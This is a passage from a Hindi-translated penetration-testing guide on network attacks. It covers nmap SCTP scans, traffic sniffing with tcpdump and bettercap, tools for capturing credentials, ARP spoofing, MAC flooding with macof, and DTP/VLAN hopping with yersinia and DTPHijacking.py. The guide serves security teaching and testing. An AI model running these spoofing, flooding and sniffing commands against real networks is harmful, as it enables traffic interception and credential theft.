**SCTP (рд╕реНрдЯреНрд░реАрдо рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╕рд╛рд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдХрд╛ рдЙрдкрдпреЛрдЧ **TCP (рдкреНрд░рд╕рд╛рд░рдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдФрд░ **UDP (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдЯреЗрд▓реАрдлреЛрдиреА рдбреЗрдЯрд╛ рдХреЛ рдЖрдИрдкреА рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рдирд╛ рд╣реИ, рдЬреЛ **рд╕рд┐рдЧреНрдирд▓рд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо 7 (SS7)** рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдХрд░рддрд╛ рд╣реИред **SCTP** **SIGTRAN** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░рд┐рд╡рд╛рд░ рдХрд╛ рдПрдХ рдореМрд▓рд┐рдХ рдШрдЯрдХ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЖрдИрдкреА рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ SS7 рд╕рд┐рдЧреНрдирд▓ рдХреЛ рдкрд╣реБрдВрдЪрд╛рдирд╛ рд╣реИред

**SCTP** рдХрд╛ рд╕рдорд░реНрдерди **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, рдФрд░ **VxWorks** рдЬреИрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЗрд╕рдХреА рд╡реНрдпрд╛рдкрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдФрд░ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЯреЗрд▓реАрдХрдореНрдпреВрдирд┐рдХреЗрд╢рди рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВред

**nmap** рджреНрд╡рд╛рд░рд╛ **SCTP** рдХреЗ рд▓рд┐рдП рджреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдХреИрди рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: _-sY_ рдФрд░ _-sZ_

```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```

### IDS рдФрд░ IPS рдЙрдкрд╛рдп

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **рдФрд░ nmap рд╡рд┐рдХрд▓реНрдк**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддреЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

**рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░рд╛рдЙрдЯрд░, рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕реЗрд╕** рдХрднреА-рдХрднреА **рдЧреИрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕реНрд░реЛрдд рдкрддреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдмреНрд╕ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреЗ рд╣реИрдВред **tcpdump** рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рджреМрд░рд╛рди рдЧреИрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкрддреЛрдВ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдкреИрдХреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, Kali Linux рдкрд░, рдкреИрдХреЗрдЯреНрд╕ рдХреЛ **eth2 рдЗрдВрдЯрд░рдлреЗрд╕** рдкрд░ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХрд╛ рд╕реЗрдЯрдЕрдк рдПрдХ NAT рдпрд╛ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЗ рдкреАрдЫреЗ рд╣реИ, рддреЛ рдРрд╕реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред

```bash
tcpdump тАУnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## рд╕реНрдирд┐рдлрд┐рдВрдЧ

рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдЬрд░рд┐рдП рдЖрдк рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдлреНрд░реЗрдо рдФрд░ рдкреИрдХреЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдХреЗ рдЖрдИрдкреА рд░реЗрдВрдЬ, рд╕рдмрдиреЗрдЯ рд╕рд╛рдЗрдЬрд╝, рдПрдордПрд╕реА рдкрддреЗ рдФрд░ рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рдХреЗ рд╡рд┐рд╡рд░рдг рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧрд▓рддреА рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлреИрдмреНрд░рд┐рдХ рддрдирд╛рд╡ рдореЗрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреИрд╕рд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдПрдХ рд╕реНрд╡рд┐рдЪреНрдб рдЗрдерд░рдиреЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдлреНрд░реЗрдо рдФрд░ рдЖрдкрдХреЗ рдПрдордПрд╕реА рдкрддреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рджреЗрдЦреЗрдВрдЧреЗред

### TCPDump

```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```

рдПрдХ рд╡реНрдпрдХреНрддрд┐ рдПрдХ SSH рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд╛рдпрд░рд╢рд╛рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╛рдпрд░рд╢рд╛рд░реНрдХ рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ GUI рдХреЗ рд╕рд╛рде рд░рд┐рдореЛрдЯ рдорд╢реАрди рд╕реЗ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```

### рдмреЗрд╣рддрд░ рдХреИрдк

```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```

### Wireshark

рд╕реНрдкрд╖реНрдЯ рд╣реИред

### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░

рдЖрдк [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк pcap рдпрд╛ рд▓рд╛рдЗрд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХреЗрдВред

## LAN рд╣рдорд▓реЗ

### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдореЗрдВ рдирд┐:рд╢реБрд▓реНрдХ ARPResponses рднреЗрдЬрдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд╣реЛ рдХрд┐ рдХрд┐рд╕реА рдорд╢реАрди рдХрд╛ IP рд╣рдорд╛рд░реА рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ MAC рд╣реИред рдлрд┐рд░, рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ ARP рддрд╛рд▓рд┐рдХрд╛ рдмрджрд▓ рджреЗрдЧрд╛ рдФрд░ рдЬрдм рднреА рд╡рд╣ IP рд╕реНрдкреВрдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдЧрд╛ рддреЛ рд╣рдорд╛рд░реА рдорд╢реАрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдЧрд╛ред

#### **Bettercap**

```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **рдЖрд░реНрдкреАрд╕реНрдкреВрдл**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC рднрд░рд╛рдИ - CAM рдУрд╡рд░рдлреНрд▓реЛ

рд╕реНрд╡рд┐рдЪ рдХреА CAM рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрдд MAC рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВред рдЬрдм CAM рддрд╛рд▓рд┐рдХрд╛ рднрд░ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИ (рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рдирд╛)ред

```bash
macof -i <interface>
```

### 802.1Q VLAN / DTP рд╣рдорд▓реЗ

#### рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ

**рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DTP)** рдПрдХ рд▓рд┐рдВрдХ рдкрд░рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рдгрд╛рд▓реА рдХреЛ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд┐рдЪреЗрд╕ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреЛрд░реНрдЯ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХреЗрдВ (рдЯреНрд░рдВрдХ) рдпрд╛ рдЧреИрд░-рдЯреНрд░рдВрдХрд┐рдВрдЧ рдореЛрдб рдХреЗ рд▓рд┐рдПред **DTP** рдХрд╛ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдЕрдХреНрд╕рд░ рдЙрдкрдпреБрдХреНрдд рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рдЬрд╝рд╛рдЗрди рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗрд╡рд▓ рд╡рд╣рд╛рдБ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдиреЗ рдкрд░ рд╣рд╛рде рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рдПрдВ рдФрд░ рд╕рд╣реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдбрд╛рдпрдирд╛рдорд┐рдХ рдСрдЯреЛ рдореЛрдб рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡реЗ рддреНрд░рдВрдХрд┐рдВрдЧ рдХреЛ рдкреНрд░реЛрдореНрдкреНрдЯ рдХрд░рдиреЗ рдкрд░ рддреИрдпрд╛рд░ рд╣реИрдВ рдпрджрд┐ рдПрдХ рдкрдбрд╝реЛрд╕реА рд╕реНрд╡рд┐рдЪ рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПред рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдпрд╛ рд╣рдорд▓рд╛рд╡рд░ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ DTP рдЗрдЪреНрдЫреБрдХ рдлреНрд░реЗрдо рднреЗрдЬрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ STP рдлреНрд░реЗрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ VLANs рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗрдЯ рдХрд░рдХреЗ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдКрдкрд░ рд╕реЗ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддреА рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдИ рд╕реНрд╡рд┐рдЪреЛрдВ рдореЗрдВ DTP рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рд╢рддреНрд░реБ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реЗ рдПрдХ рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдорд┐рдорд┐рдХ рдХрд░ рд╕рдХреЗрдВ, рдЗрд╕рдХреЗ рдлрд▓рд╕реНрд╡рд░реВрдк рд╕рднреА VLANs рдХреЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕реНрдХреНрд░рд┐рдкреНрдЯ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ, рдЯреНрд░рдВрдХ, рдбрд╛рдпрдирд╛рдорд┐рдХ, рдСрдЯреЛ, рдпрд╛ рдПрдХреНрд╕реЗрд╕ рдореЛрдб рдореЗрдВ рд╣реИтАФрдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдХреЗрд╡рд▓ рдЕрдВрддрд┐рдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди VLAN рд╣реЙрдкрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рд╕реЗ рдореБрдХреНрдд рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рд╕реНрд╡рд┐рдЪ рдХреА рднреЗрджреНрдпрддрд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИред

рдпрджрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХреА рднреЗрджреНрдпрддрд╛ рдкрд╣рдЪрд╛рдиреА рдЬрд╛рддреА рд╣реИ, рддреЛ _**Yersinia**_ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ "рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рдХреНрд╖рдо" рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП DTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬрд┐рд╕рд╕реЗ рд╕рднреА VLANs рд╕реЗ рдкреИрдХреЗрдЯреНрд╕ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```

![](<../../.gitbook/assets/image (646) (1).png>)

VLANs рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)\*\* рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде DTP рдЗрдЪреНрдЫреБрдХ рдлреНрд░реЗрдо рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХрд┐рд╕реА рднреА рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдмрд╛рдзрд┐рдд рди рдХрд░реЗрдВред рдпрд╣ рд╣рд░ рддреАрди рд╕реЗрдХрдВрдб рдореЗрдВ DTP рдЗрдЪреНрдЫреБрдХ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред **рд╕реНрд╡рд┐рдЪ рдкрд░ рдбрд╛рдпрдиреЗрдорд┐рдХ рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП рдЯреНрд░рдВрдХ рдЪреИрдирд▓ рдХреЗрд╡рд▓ рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рд░рд╣рддреЗ рд╣реИрдВред рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж, рдЯреНрд░рдВрдХ рдЧрд┐рд░ рдЬрд╛рддрд╛ рд╣реИред**

```
sudo python3 DTPHijacking.py --interface eth0
```

рдореИрдВ рдпрд╣ рджрд░реНрд╢рд╛рдирд╛ рдЪрд╛рд╣реВрдВрдЧрд╛ рдХрд┐ **Access/Desirable (0x03)** рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рдбреАрдЯреАрдкреА рдлреНрд░реЗрдо рд╡рд╛рдВрдЫрдиреАрдп рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реИ, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред рдФрд░ **802.1Q/802.1Q (0xa5)** рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ **802.1Q** рдПрдиреНрдХреИрдкреНрд╕реБрд▓реЗрд╢рди рдкреНрд░рдХрд╛рд░ред

STP рдлреНрд░реЗрдо рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, **рд╣рдореЗрдВ VLAN 30 рдФрд░ VLAN 60 рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк VLAN рдЖрдИрдбреА рдФрд░ рдЖрдИрдкреА рдорд╛рдиреЛрдВ рдХреЛ рдЬрд╛рди рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЕрдЧрд░ DHCP рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕реНрдерд┐рд░ рдЖрдИрдкреА рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _ifconfig_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд VLAN рд╣реЙрдкрд░

